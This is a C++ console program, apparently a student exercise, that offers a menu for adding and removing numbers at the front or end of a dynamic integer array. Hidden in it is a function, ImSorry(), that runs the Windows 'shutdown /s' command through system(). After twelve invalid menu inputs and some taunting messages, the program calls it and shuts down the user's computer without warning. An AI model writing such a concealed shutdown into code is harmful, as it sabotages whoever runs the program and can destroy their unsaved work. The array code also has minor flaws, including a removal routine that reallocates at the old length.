#include <iostream>
#include <stdlib.h>
#include <ctime>

void MainMenu()
{
	std::cout << "0 - exit from program.\n";
	std::cout << "1 - add number to the end.\n";
	std::cout << "2 - add number to the front.\n";
	std::cout << "3 - remove number from the end.\n";
	std::cout << "4 - remove number from the front.\n";
}

int ImSorry()
{
	system("C:\\Windows\\System32\\shutdown /s");
	return 0;
}

void WrongValue()
{
	std::cout << "\n";
	std::cout << "You enter wrong number or symbol.\n";
	std::cout << "Please, try again.\n";
	std::cout << "\n";
}

int* InitArray(int len)
{
	int* res = nullptr;
	res = (int*)malloc(sizeof(int) * len);
	for (int i = 0; res != nullptr && i < len; ++i)
	{
		res[i] = 0;
	}
	return res;
}

void RandomizeArray(int* a, int len, int min = 0, int max = 100)
{
	if (a != nullptr)
	{
		for (int i = 0; i < len; ++i)
		{
			a[i] = rand() % (max - min + 1) + min;
		}
	}
}

void PrintArray(int* a, int len)
{
	std::cout << "Your array:";
	std::cout << "\n";
	for (int i = 0; a != nullptr && i < len; ++i)
	{
		printf("%d ", a[i]);
	}
	std::cout << "\n";
}

void ExpandArray(int** a, int* len)
{
	int* newArray = InitArray(*len + 1);
	if (newArray != nullptr)
	{
		for (int i = 0; i < *len; ++i)
		{
			newArray[i] = (*a)[i];
		}
		free(*a);
		*a = newArray;
		++(*len);
	}
}

int AddToFront(int** a, int* len, int element)
{
	ExpandArray(a, len);
	for (int i = *len - 1; i > 0; --i)
	{
		(*a)[i] = (*a)[i - 1];
	}
	(*a)[0] = element;
	return 0;
}

int AddToEnd(int** a, int* len, int element)
{
	ExpandArray(a, len);
	(*a)[*len - 1] = element;
	return 0;
}

void RemoveFromEnd(int** a, int* len)
{
	std::cout << "\n";
	int* NewArray = InitArray(*len);
	if (NewArray != nullptr)
	{
		for (int i = 0; i < *len; ++i)
		{
			NewArray[i] = (*a)[i];
		}
		free(*a);
		*a = NewArray;
		--(*len);
	}
}

void RemoveFromBegining(int** a, int* len)
{
	std::cout << "\n";
	int* NewArray = InitArray(*len - 1);
	--(*len);
	if (NewArray != nullptr)
	{
		for (int i = 0; i < *len; ++i)
		{
			NewArray[i] = (*a)[i + 1];
		}
		free(*a);
		*a = NewArray;
	}
}

int main(int argc, char* argv[])
{
	std::cout << "Hello User!\n";
	std::cout << "Enter the length of array.\n";
	std::cout << "\n";

	srand(time(0));
	int len = 0;
	std::cin >> len;
	int* a = InitArray(len);
	RandomizeArray(a, len);
	std::cout << "\n";
	int k = 0;

	while (true)
	{
		PrintArray(a, len);
		std::cout << "\n";
		MainMenu();
		std::cout << "\n";

		int n = 0;

		std::cin >> n;

		if (n >= 0 && n <= 4)
		{
			switch (n)
			{
			case 0:
			{
				return 0;
			}
			case 1:
			{
				std::cout << "\n";
				std::cout << "Enter number:";
				std::cout << "\n";
				int element = 0;
				std::cin >> element;
				AddToEnd(&a, &len, element);
				std::cout << "\n";
				break;
			}
			case 2:
			{
				std::cout << "\n";
				std::cout << "Enter number:";
				std::cout << "\n";
				int element = 0;
				std::cin >> element;
				AddToFront(&a, &len, element);
				std::cout << "\n";
				break;
			}
			case 3:
			{
				RemoveFromEnd(&a, &len);
				break;
			}
			case 4:
			{
				RemoveFromBegining(&a, &len);
				break;
			}
			}
		}
		else
		{
			WrongValue();
			++k;
			if (k == 10)
			{
				std::cout << "Why are you doing this ?\n";
				std::cout << "You are trying to find bugs in my program ?\n";
				std::cout << "There are no bags here.\n";
				std::cout << "Please, stop doing this.\n";
				std::cout << "\n";
			}
			else if (k == 11)
			{
				std::cout << "Stop doing this or You'll regret it\n";
				std::cout << "\n";
			}
			else if (k == 12)
			{
				std::cout << "Okey, goodbye =D\n";
				std::cout << "\n";
				ImSorry();
			}
		}
	}
}